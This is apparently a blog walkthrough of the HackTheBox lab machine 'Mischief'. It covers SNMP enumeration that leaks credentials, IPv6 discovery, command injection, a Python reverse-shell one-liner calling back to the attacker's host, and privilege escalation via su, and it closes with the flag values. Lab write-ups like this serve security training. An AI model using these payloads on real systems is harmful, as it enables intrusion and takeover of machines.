---
layout: post
title: Hackthebox Mischief Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-11-21/mischief-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Mischief".<br>

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.92 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-20 15:43 EET
Nmap scan report for 10.10.10.92
Host is up (0.047s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth:
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.65 seconds
{% endhighlight %}

#### UDP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -sU 10.10.10.92 --top-ports 1000
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-20 15:47 EET
Nmap scan report for 10.10.10.92
Host is up (0.047s latency).
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
{% endhighlight %}

### 2. Getting User

We have only one service which is protected by Basic Auth.
{% highlight shell %}
root@kali:~# curl -i http://10.10.10.92:3366
HTTP/1.0 401 Unauthorized
Server: SimpleHTTP/0.6 Python/2.7.15rc1
Date: Wed, 20 Nov 2019 13:53:16 GMT
WWW-Authenticate: Basic realm="Test"
Content-type: text/html

no auth header received
{% endhighlight %}

Then, try to look at UDP port 161 which is SNMP.
{% highlight shell %}
root@kali:~# snmp-check -p 161 -c public 10.10.10.92
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.92:161 using SNMPv1 and community 'public'

---

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              systemd               /sbin/init            maybe-ubiquity      
  2                     runnable              kthreadd                                                        
  4                     unknown               kworker/0:0H                                                    
  5                     unknown               kworker/u2:0                                                    
  6                     unknown               mm_percpu_wq                                                    
  7                     runnable              ksoftirqd/0                                                     
  8                     unknown               rcu_sched                                                       
  9                     unknown               rcu_bh                                                          
  10                    runnable              migration/0                                                     
  11                    runnable              watchdog/0                                                      
  12                    runnable              cpuhp/0                                                         
  13                    runnable              kdevtmpfs                                                       
  14                    unknown               netns                                                           
  15                    runnable              rcu_tasks_kthre                                                 
  16                    runnable              kauditd                                                         
  17                    runnable              khungtaskd                                                      
  18                    runnable              oom_reaper                                                      
  19                    unknown               writeback                                                       
  20                    runnable              kcompactd0                                                      
  21                    runnable              ksmd                                                            
  22                    runnable              khugepaged                                                      
  23                    unknown               crypto                                                          
  24                    unknown               kintegrityd                                                     
  25                    unknown               kblockd                                                         
  26                    unknown               ata_sff                                                         
  27                    unknown               md                                                              
  28                    unknown               edac-poller                                                     
  29                    unknown               devfreq_wq                                                      
  30                    unknown               watchdogd                                                       
  32                    unknown               kworker/0:1                                                     
  34                    runnable              kswapd0                                                         
  35                    runnable              ecryptfs-kthrea                                                 
  77                    unknown               kthrotld                                                        
  78                    unknown               acpi_thermal_pm                                                 
  79                    runnable              scsi_eh_0                                                       
  80                    unknown               scsi_tmf_0                                                      
  81                    runnable              scsi_eh_1                                                       
  82                    unknown               scsi_tmf_1                                                      
  84                    unknown               kworker/0:2                                                     
  89                    unknown               ipv6_addrconf                                                   
  98                    unknown               kstrp                                                           
  115                   unknown               charger_manager                                                 
  180                   unknown               mpt_poll_0                                                      
  181                   unknown               mpt/0                                                           
  220                   runnable              scsi_eh_2                                                       
  221                   unknown               scsi_tmf_2                                                      
  222                   unknown               ttm_swap                                                        
  224                   runnable              irq/16-vmwgfx                                                   
  225                   unknown               kworker/0:1H                                                    
  294                   unknown               raid5wq                                                         
  345                   runnable              jbd2/sda2-8                                                     
  346                   unknown               ext4-rsv-conver                                                 
  394                   unknown               iscsi_eh                                                        
  397                   runnable              vmtoolsd              /usr/bin/vmtoolsd                         
  398                   runnable              systemd-journal       /lib/systemd/systemd-journald                      
  409                   unknown               ib-comp-wq                                                      
  412                   unknown               ib_mcast                                                        
  413                   unknown               ib_nl_sa_wq                                                     
  416                   runnable              lvmetad               /sbin/lvmetad         -f                  
  417                   unknown               rdma_cm                                                         
  423                   runnable              systemd-udevd         /lib/systemd/systemd-udevd                      
  507                   runnable              systemd-network       /lib/systemd/systemd-networkd                      
  536                   runnable              systemd-resolve       /lib/systemd/systemd-resolved                      
  538                   runnable              systemd-timesyn       /lib/systemd/systemd-timesyncd                      
  557                   runnable              dbus-daemon           /usr/bin/dbus-daemon  --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  558                   runnable              systemd-logind        /lib/systemd/systemd-logind                      
  559                   runnable              lxcfs                 /usr/bin/lxcfs        /var/lib/lxcfs/     
  562                   runnable              cron                  /usr/sbin/cron        -f                  
  563                   runnable              VGAuthService         /usr/bin/VGAuthService                      
  565                   runnable              atd                   /usr/sbin/atd         -f                  
  567                   runnable              accounts-daemon       /usr/lib/accountsservice/accounts-daemon                      
  569                   runnable              rsyslogd              /usr/sbin/rsyslogd    -n                  
  571                   runnable              cron                  /usr/sbin/CRON        -f                  
  582                   runnable              networkd-dispat       /usr/bin/python3      /usr/bin/networkd-dispatcher
  583                   running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
  592                   runnable              sh                    /bin/sh               -c /home/loki/hosted/webstart.sh
  599                   runnable              sh                    /bin/sh               /home/loki/hosted/webstart.sh
  600                   runnable              python                python                -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
  605                   runnable              polkitd               /usr/lib/policykit-1/polkitd  --no-debug          
  624                   runnable              sshd                  /usr/sbin/sshd        -D                  
  641                   runnable              iscsid                /sbin/iscsid                              
  642                   runnable              iscsid                /sbin/iscsid                              
  679                   runnable              agetty                /sbin/agetty          -o -p -- \u --noclear tty1 linux
  735                   runnable              apache2               /usr/sbin/apache2     -k start            
  779                   runnable              mysqld                /usr/sbin/mysqld      --daemonize --pid-file=/run/mysqld/mysqld.pid
  800                   runnable              apache2               /usr/sbin/apache2     -k start            
  801                   runnable              apache2               /usr/sbin/apache2     -k start            
  802                   runnable              apache2               /usr/sbin/apache2     -k start            
  803                   runnable              apache2               /usr/sbin/apache2     -k start            
  804                   runnable              apache2               /usr/sbin/apache2     -k start            
  1095                  unknown               kworker/u2:1                                                    
  1115                  unknown               kworker/u2:2                                                    

---

{% endhighlight %}

In this command output, we can find the credential of the Basic Auth.
{% highlight shell %}
python -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
{% endhighlight %}

With the credential, we can login to the web server for IPv6.
{% highlight shell %}
loki:godofmischiefisloki
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-11-21/2019-11-20-16-03-52.png)
![placeholder](https://inar1.github.io/public/images/2019-11-21/2019-11-20-16-04-22.png)

We got another credential. Then, try to look for a place to use.<br>
If we go over the above process enumeration, we can find that apache is running but there is no port listening.
{% highlight shell %}
apache2 usr/sbin/apache2 -k start
{% endhighlight %}

Then, enumerate IPv6 address.<br>
We can use a SNMP IPv6 enumerator <a href="https://github.com/trickster0/Enyx">enyx</a> for this purpose.
{% highlight shell %}
root@kali:~# python Enyx/enyx.py 1 public 10.10.10.92
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:c793
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:c793
root@kali:~# 
{% endhighlight %}

Now we found a Unique-Local address "dead:beef:0000:0000:0250:56ff:feb9:c793".<br>
Try to access with web browser.
![placeholder](https://inar1.github.io/public/images/2019-11-21/2019-11-20-16-27-19.png)

Then, login to the console with the following password found on port 3366.<br>
However, this does not work.
{% highlight shell %}
loki:trickeryanddeceit
{% endhighlight %}

After some trying common password combination, we can find out that the following credential works.
{% highlight shell %}
administrator:trickeryanddeceit
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-11-21/2019-11-20-16-42-09.png)

If we put just like "id;", we can see that the command is executed.
![placeholder](https://inar1.github.io/public/images/2019-11-21/2019-11-20-16-48-42.png)

Next, launch a netcat listener with "ncat". This is because it has an option "-6" for IPv6.
{% highlight shell %}
root@kali:~# ncat -6 -lvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234

{% endhighlight %}

Then, try to invoke a reverse shell.<br>
We can use a python reverse shell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>.<br>
<br>
At first, we have to figure out global IPv6 address of our host
{% highlight shell %}
root@kali:~#  ip a | grep inet6 | grep global
    inet6 dead:beef:2::100b/64 scope global 

root@kali:~#
{% endhighlight %}

Then, give some modification for the given python payload and execute.
#### python payload used:
{% highlight shell %}
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100b",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");';
{% endhighlight %}

Now, we got a reverse shell as user "www-data".
{% highlight shell %}
root@kali:~# ncat -6 -lv dead:beef:2::100b 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on dead:beef:2::100b:443
Ncat: Connection from dead:beef::250:56ff:feb9:c793.
Ncat: Connection from dead:beef::250:56ff:feb9:c793:59574.
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
{% endhighlight %}

Then, try to look at the home directory of only one user "loki".<br>
We can find a possible password "lokiisthebestnorsegod".
{% highlight shell %}
$ pwd
pwd
/home/loki

$ cat credentials
cat credentials
pass: lokiisthebestnorsegod

$
{% endhighlight %}

Since we have ssh running on the target, we can login as "loki" with the above password.
{% highlight shell %}
loki:lokiisthebestnorsegod
{% endhighlight %}
{% highlight shell %}
root@kali:~# ssh loki@10.10.10.92
loki@10.10.10.92's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

---

Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
loki@Mischief:~$ id
uid=1000(loki) gid=1004(loki) groups=1004(loki)

loki@Mischief:~
{% endhighlight %}

user.txt is in the directory of "/home/loki".
{% highlight shell%}
loki@Mischief:~$ cat user.txt 
bf58078e7b802c5f32b545eea7c90060

loki@Mischief:~$
{% endhighlight %}

### 3. Getting Root

In ".bash_history", we can find a possible credential "loki:lokipasswordmischieftrickery".
{% highlight shell %}
loki@Mischief:~$ cat .bash_history 
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history 
nano .bash_history 
exit

loki@Mischief:~$
{% endhighlight %}


We can find an interesting thing that user "loki" can't use a command "su" due to its permission.
{% highlight shell %}
loki@Mischief:~$ su root
-bash: /bin/su: Permission denied

loki@Mischief:~$ ls -l /bin/su
-rwsr-xr-x+ 1 root root 44664 Jan 25  2018 /bin/su

loki@Mischief:~$ 
{% endhighlight %}

This is because <a href="https://wiki.archlinux.org/index.php/Access_Control_Lists">Access Control List</a> doesn't allow user "loki" to execute the command.<br>
We can confirm that with "getfacl" command.
{% highlight shell %}
loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x

loki@Mischief:~$
{% endhighlight %}

However, if we take a look at user "www-data", we can notice that we can run "su" command and become "root"
{% highlight shell %}
$ su root
su root
Password: lokipasswordmischieftrickery

root@Mischief:/home/loki# id
id
uid=0(root) gid=0(root) groups=0(root)

root@Mischief:/home/loki#
{% endhighlight %}

However, we don't have a correct "root.txt" in the directory "/root".
{% highlight shell %}
root@Mischief:/home/loki# cat /root/root.txt
cat /root/root.txt
The flag is not here, get a shell to find it!

root@Mischief:/home/loki#
{% endhighlight %}

By running following command, we can find the correct "root.txt".
{% highlight shell %}
root@Mischief:~# find / -name root.txt -type f
find / -name root.txt -type f
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt

root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad479c56f912c65d7be4487807

root@Mischief:~#
{% endhighlight %}
